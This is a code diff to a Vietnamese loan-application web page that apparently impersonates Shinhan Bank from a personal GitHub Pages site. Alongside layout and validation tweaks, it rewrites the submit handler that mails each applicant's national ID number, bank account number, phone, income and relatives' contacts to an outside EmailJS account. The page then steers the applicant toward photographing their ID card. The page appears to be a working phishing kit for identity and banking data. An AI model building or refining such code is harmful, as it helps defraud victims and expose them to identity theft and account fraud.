@@ -82,6 +82,30 @@
                 font-size: 10px;
                 padding: 6px 8px;
             }
+            .row-group {
+                flex-direction: column; /* Xếp dọc trên mobile để tránh lệch */
+                gap: 10px;
+            }
+            .form-group {
+                width: 100%; /* Đảm bảo form-group chiếm toàn bộ chiều rộng */
+                padding: 0; /* Giảm padding để tránh tràn */
+            }
+            .custom-select-toggle, .custom-select-list {
+                width: 100%; /* Đảm bảo dropdown ngân hàng co giãn đầy đủ */
+            }
+            .container {
+                padding: 10px; /* Giảm padding container cho mobile */
+                margin: 10px 2.5%; /* Giảm margin để tận dụng không gian */
+            }
+            .header {
+                padding: 10px; /* Giảm padding header trên mobile */
+            }
+            .header img {
+                height: 30px; /* Giảm kích thước logo cho phù hợp */
+            }
+            .header-icons i {
+                font-size: 20px; /* Giảm kích thước icon cho mobile */
+            }
         }
         .section-title {
             color: #0033a0;
@@ -341,10 +365,51 @@
             margin-top: 15px;
             font-size: 14px;
             width: 100%;
+            border-collapse: collapse;
         }
         .calculation-table th, .calculation-table td {
-            padding: 8px;
+            padding: 6px;
             text-align: center;
+            border: 1px solid #d3d3d3;
+        }
+        .calculation-table th {
+            background-color: #e6f0fa;
+            font-weight: 500;
+        }
+        @media (max-width: 767px) {
+            .calculation-table {
+                display: block;
+                font-size: 12px;
+            }
+            .calculation-table thead {
+                display: none;
+            }
+            .calculation-table tbody tr {
+                display: flex;
+                flex-wrap: wrap;
+                padding: 8px 0;
+                border-bottom: 1px solid #d3d3d3;
+            }
+            .calculation-table tbody td {
+                flex: 1 1 100%;
+                padding: 4px;
+                text-align: left;
+                display: flex;
+                justify-content: space-between;
+                font-size: 11px;
+            }
+            .calculation-table tbody td:before {
+                content: attr(data-label);
+                font-weight: 500;
+                color: #1a3c87;
+                display: block;
+                flex: 0 0 35%;
+            }
+            .calculation-table tbody td:nth-child(1):before { content: "Tháng: "; }
+            .calculation-table tbody td:nth-child(2):before { content: "Gốc: "; }
+            .calculation-table tbody td:nth-child(3):before { content: "Lãi: "; }
+            .calculation-table tbody td:nth-child(4):before { content: "Tổng: "; }
+            .calculation-table tbody td:nth-child(5):before { content: "Dư nợ: "; }
         }
         .success-message {
             color: #28a745;
@@ -364,40 +429,6 @@
         .spinner {
             display: none;
             margin-left: 8px;
-        }
-        @media (max-width: 767px) {
-            .calculation-table {
-                display: block;
-                font-size: 12px;
-            }
-            .calculation-table thead {
-                display: none;
-            }
-            .calculation-table tbody tr {
-                display: flex;
-                flex-wrap: wrap;
-                padding: 10px 0;
-                border-bottom: 1px solid #d3d3d3;
-            }
-            .calculation-table tbody td {
-                flex: 1 1 100%;
-                padding: 5px;
-                text-align: left;
-                display: flex;
-                justify-content: space-between;
-            }
-            .calculation-table tbody td:before {
-                content: attr(data-label);
-                font-weight: 500;
-                color: #1a3c87;
-                display: block;
-                flex: 0 0 40%;
-            }
-            .calculation-table tbody td:nth-child(1):before { content: "Tháng: "; }
-            .calculation-table tbody td:nth-child(2):before { content: "Gốc: "; }
-            .calculation-table tbody td:nth-child(3):before { content: "Lãi: "; }
-            .calculation-table tbody td:nth-child(4):before { content: "Tổng: "; }
-            .calculation-table tbody td:nth-child(5):before { content: "Dư nợ: "; }
         }
     </style>
 </head>
@@ -894,7 +925,6 @@
                                 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR-K_tILLruPVwElDRsaRWGCpM0I0CEda-8yg&s" alt="Kookmin Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                 Kookmin Bank Vietnam (Kookminbank)
                             </div>
-                        </div>
                     </div>
                     <input type="hidden" id="bankName" name="bankName" required>
                     <div class="invalid-feedback" id="bankNameError"></div>
@@ -964,7 +994,6 @@
     <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4.4.1/dist/email.min.js"></script>
     <script>
-        // Initialize EmailJS
         try {
             emailjs.init("OrBsI926QI2_xBh1f");
             console.log('EmailJS initialized successfully');
@@ -976,10 +1005,8 @@
         let userData = {};
         let registeredUsers = JSON.parse(localStorage.getItem('registeredUsers')) || [];
 
-        // Initialize tooltips, input masks, and default disbursement date
         $(document).ready(function(){
             $('[data-bs-toggle="tooltip"]').tooltip();
-            // Hàm định dạng số điện thoại
             function formatPhoneNumber(input) {
                 let value = input.value.trim().replace(/\s/g, '');
                 if (value.startsWith('+84')) {
@@ -987,9 +1014,7 @@
                 } else if (!value.startsWith('0') && value.length >= 9) {
                     value = '0' + value;
                 }
-                // Loại bỏ các ký tự không phải số
                 value = value.replace(/[^0-9]/g, '');
-                // Giới hạn độ dài tối đa 10 chữ số
                 if (value.length > 10) {
                     value = value.slice(0, 10);
                 }
@@ -997,7 +1022,6 @@
                 return /^0[1-9]\d{8}$/.test(value);
             }
 
-            // Áp dụng cho số điện thoại cá nhân
             $('#phone').on('input', function() {
                 if (!formatPhoneNumber(this)) {
                     $(this).closest('.form-group').addClass('is-invalid');
@@ -1013,7 +1037,6 @@
                 placeholder: "0_________"
             });
 
-            // Áp dụng cho số điện thoại người thân
             $('#relativePhone').on('input', function() {
                 if (!formatPhoneNumber(this)) {
                     $(this).closest('.form-group').addClass('is-invalid');
@@ -1044,7 +1067,6 @@
             updateInterestRate();
             initializeCustomBankSelect();
 
-            // Handle custom loan amount visibility
             document.getElementById('loanAmount').addEventListener('change', function() {
                 const customGroup = document.getElementById('customLoanAmountGroup');
                 if (this.value === 'other') {
@@ -1056,13 +1078,11 @@
             });
         });
 
-        // Handle image load errors for bank logos
         function handleImageError(img, bankName) {
             console.warn(`Failed to load logo for ${bankName}: ${img.src}`);
             img.src = 'https://via.placeholder.com/30?text=Bank';
         }
 
-        // Initialize Custom Bank Select Dropdown
         function initializeCustomBankSelect() {
             const bankSelect = document.getElementById('bank-select');
             const bankToggle = bankSelect.querySelector('.custom-select-toggle');
@@ -1113,7 +1133,6 @@
                 }
             });
 
-            // Validate on form submission
             document.getElementById('registrationForm').addEventListener('submit', (e) => {
                 if (!bankInput.value) {
                     bankSelect.classList.add('is-invalid');
@@ -1126,7 +1145,6 @@
             });
         }
 
-        // Auto-select interest rate based on loan type
         const updateInterestRate = () => {
             const loanType = document.getElementById('loanType').value || userData.loanType || '';
             const interestRate = document.getElementById('interestRate');
@@ -1148,7 +1166,6 @@
             this.value = parseFloat(this.value).toFixed(2);
         });
 
-        // Load user data on page load
         window.onload = function() {
             loadUserData();
             updateInterestRate();
@@ -1249,6 +1266,7 @@
         function validateForm() {
             let isValid = true;
             let errorMessages = [];
+            let firstErrorElement = null;
             const today = new Date();
             today.setHours(0, 0, 0, 0);
             const fields = [
@@ -1336,10 +1354,12 @@
                 const parent = element.closest('.form-group') || element.closest('.custom-select') || element.parentElement;
                 if (!field.validate(value)) {
                     errorElement.textContent = field.message;
+                    errorElement.style.color = '#ff4d4f';
                     errorMessages.push(`${field.id}: ${field.message}`);
                     console.error(`Validation failed for ${field.id}: ${field.message}`);
                     if (parent) {
                         parent.classList.add('is-invalid');
+                        if (!firstErrorElement) firstErrorElement = element;
                     } else {
                         console.warn(`No parent element found for ${field.id}`);
                     }
@@ -1357,9 +1377,11 @@
                 errorMessages.push(duplicateMessage);
                 console.error('Duplicate CCCD detected:', document.getElementById('cccd').value);
                 document.getElementById('cccdError').textContent = duplicateMessage;
+                document.getElementById('cccdError').style.color = '#ff4d4f';
                 const cccdParent = document.getElementById('cccd').closest('.form-group');
                 if (cccdParent) {
                     cccdParent.classList.add('is-invalid');
+                    if (!firstErrorElement) firstErrorElement = document.getElementById('cccd');
                 }
                 isValid = false;
             }
@@ -1367,6 +1389,10 @@
             if (!isValid && errorMessages.length > 0) {
                 console.log('Validation errors:', errorMessages);
                 alert('Vui lòng kiểm tra các lỗi sau:\n- ' + errorMessages.join('\n- '));
+                if (firstErrorElement) {
+                    firstErrorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    firstErrorElement.focus();
+                }
             }
 
             return isValid;
@@ -1450,7 +1476,6 @@
             }, 1000);
         }
 
-        // Debounce function to optimize saveFormDataRealTime
         function debounce(func, wait) {
             let timeout;
             return function (...args) {
@@ -1501,7 +1526,7 @@
 
         const debouncedSave = debounce(saveFormDataRealTime, 300);
 
-        function handleSubmit(event) {
+        async function handleSubmit(event) {
             event.preventDefault();
             console.log('Form submit triggered');
             if (!validateForm()) {
@@ -1550,82 +1575,78 @@
                 emailSent: false
             };
 
-            if (saveToLocalStorage()) {
-                registeredUsers.push(userData.cccd);
-                localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
-                localStorage.setItem('registered', 'true');
-
-                let retries = 2;
-                function sendEmail() {
-                    if (!emailjs) {
-                        console.error('EmailJS not initialized');
-                        alert('Không thể gửi email. Vui lòng kiểm tra cấu hình EmailJS.');
-                        spinner.style.display = 'none';
-                        return;
-                    }
-                    emailjs.send('service_60tgxof', 'template_uhyb8ve', {
-                        full_name: userData.fullName,
-                        dob: userData.dob,
-                        gender: userData.gender,
-                        contact_address: userData.contactAddress,
-                        hometown: userData.hometown,
-                        id_number: userData.cccd,
-                        id_issue_date: userData.idIssueDate,
-                        nationality: userData.nationality,
-                        id_issue_place: userData.issuePlace,
-                        phone_number: userData.phone,
-                        email: userData.email,
-                        loan_type: userData.loanType,
-                        loan_term: userData.loanTerm ? userData.loanTerm + ' tháng' : "",
-                        loan_amount: userData.loanAmount ? parseInt(userData.loanAmount).toLocaleString('vi-VN') + ' VND' : "",
-                        disbursement_date: userData.disbursementDate,
-                        income: userData.monthlyIncome ? userData.monthlyIncome.toLocaleString('vi-VN') + ' VND' : "",
-                        occupation: userData.occupation,
-                        loan_purpose: userData.loanPurpose,
-                        company_phone: userData.relativePhone,
-                        company_address: userData.relationship,
-                        account_holder_name: userData.accountName,
-                        account_number: userData.accountNumber,
-                        bank_name: userData.bankName,
-                        loan_code: userData.loanCode,
-                        monthly_payment: userData.monthlyPayment ? userData.monthlyPayment.toLocaleString('vi-VN') + ' VND' : "",
-                        total_interest: userData.totalInterest ? userData.totalInterest.toLocaleString('vi-VN') + ' VND' : "",
-                        total_repayment: userData.totalRepayment ? userData.totalRepayment.toLocaleString('vi-VN') + ' VND' : ""
-                    })
-                    .then(response => {
-                        console.log('Email sent:', response.status, response.text);
-                        userData.emailSent = true;
-                        saveToLocalStorage();
-                        spinner.style.display = 'none';
-                        alert('Gửi hồ sơ thành công vui lòng xác minh chụp ảnh CCCD ở bước tiếp theo.');
-                        setTimeout(() => {
-                            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
-                        }, 500);
-                    }, error => {
-                        console.error('Email error:', error);
-                        if (retries > 0) {
-                            retries--;
-                            console.log(`Retrying... ${retries} attempts left`);
-                            setTimeout(sendEmail, 1000);
-                        } else {
-                            console.error('Email failed after retries:', error);
-                            spinner.style.display = 'none';
-                            alert('Gửi hồ sơ không thành công. Vui lòng kiểm tra cấu hình EmailJS hoặc thử lại.');
-                            setTimeout(() => {
-                                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html';
-                            }, 500);
-                        }
-                    });
-                }
-                sendEmail();
-            } else {
+            if (!saveToLocalStorage()) {
                 spinner.style.display = 'none';
                 alert('Lỗi lưu dữ liệu. Vui lòng kiểm tra lại thông tin hoặc mục còn thiếu.');
                 console.error('LocalStorage save failed');
+                return;
+            }
+
+            registeredUsers.push(userData.cccd);
+            localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
+            localStorage.setItem('registered', 'true');
+
+            try {
+                if (!emailjs) {
+                    throw new Error('EmailJS not initialized');
+                }
+                const response = await emailjs.send('service_60tgxof', 'template_uhyb8ve', {
+                    full_name: userData.fullName,
+                    dob: userData.dob,
+                    gender: userData.gender,
+                    contact_address: userData.contactAddress,
+                    hometown: userData.hometown,
+                    id_number: userData.cccd,
+                    id_issue_date: userData.idIssueDate,
+                    nationality: userData.nationality,
+                    id_issue_place: userData.issuePlace,
+                    phone_number: userData.phone,
+                    email: userData.email,
+                    loan_type: userData.loanType,
+                    loan_term: userData.loanTerm ? userData.loanTerm + ' tháng' : "",
+                    loan_amount: userData.loanAmount ? parseInt(userData.loanAmount).toLocaleString('vi-VN') + ' VND' : "",
+                    disbursement_date: userData.disbursementDate,
+                    income: userData.monthlyIncome ? userData.monthlyIncome.toLocaleString('vi-VN') + ' VND' : "",
+                    occupation: userData.occupation,
+                    loan_purpose: userData.loanPurpose,
+                    company_phone: userData.relativePhone,
+                    company_address: userData.relationship,
+                    account_holder_name: userData.accountName,
+                    account_number: userData.accountNumber,
+                    bank_name: userData.bankName,
+                    loan_code: userData.loanCode,
+                    monthly_payment: userData.monthlyPayment ? userData.monthlyPayment.toLocaleString('vi-VN') + ' VND' : "",
+                    total_interest: userData.totalInterest ? userData.totalInterest.toLocaleString('vi-VN') + ' VND' : "",
+                    total_repayment: userData.totalRepayment ? userData.totalRepayment.toLocaleString('vi-VN') + ' VND' : ""
+                });
+                console.log('Email sent:', response.status, response.text);
+                userData.emailSent = true;
+                saveToLocalStorage();
+                spinner.style.display = 'none';
+                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
+            } catch (error) {
+                console.error('Email error:', error);
+                let retries = 2;
+                while (retries > 0) {
+                    try {
+                        const response = await emailjs.send('service_60tgxof', 'template_uhyb8ve', { ...userData });
+                        console.log('Email sent on retry:', response.status, response.text);
+                        userData.emailSent = true;
+                        saveToLocalStorage();
+                        spinner.style.display = 'none';
+                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
+                        return;
+                    } catch (retryError) {
+                        console.error(`Retry ${3 - retries} failed:`, retryError);
+                        retries--;
+                    }
+                }
+                console.error('Email failed after retries:', error);
+                spinner.style.display = 'none';
+                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html';
             }
         }
 
-        // Auto-save progress on input change
         document.querySelectorAll('#registrationForm input, #registrationForm select').forEach(input => {
             input.addEventListener('change', debouncedSave);
         });
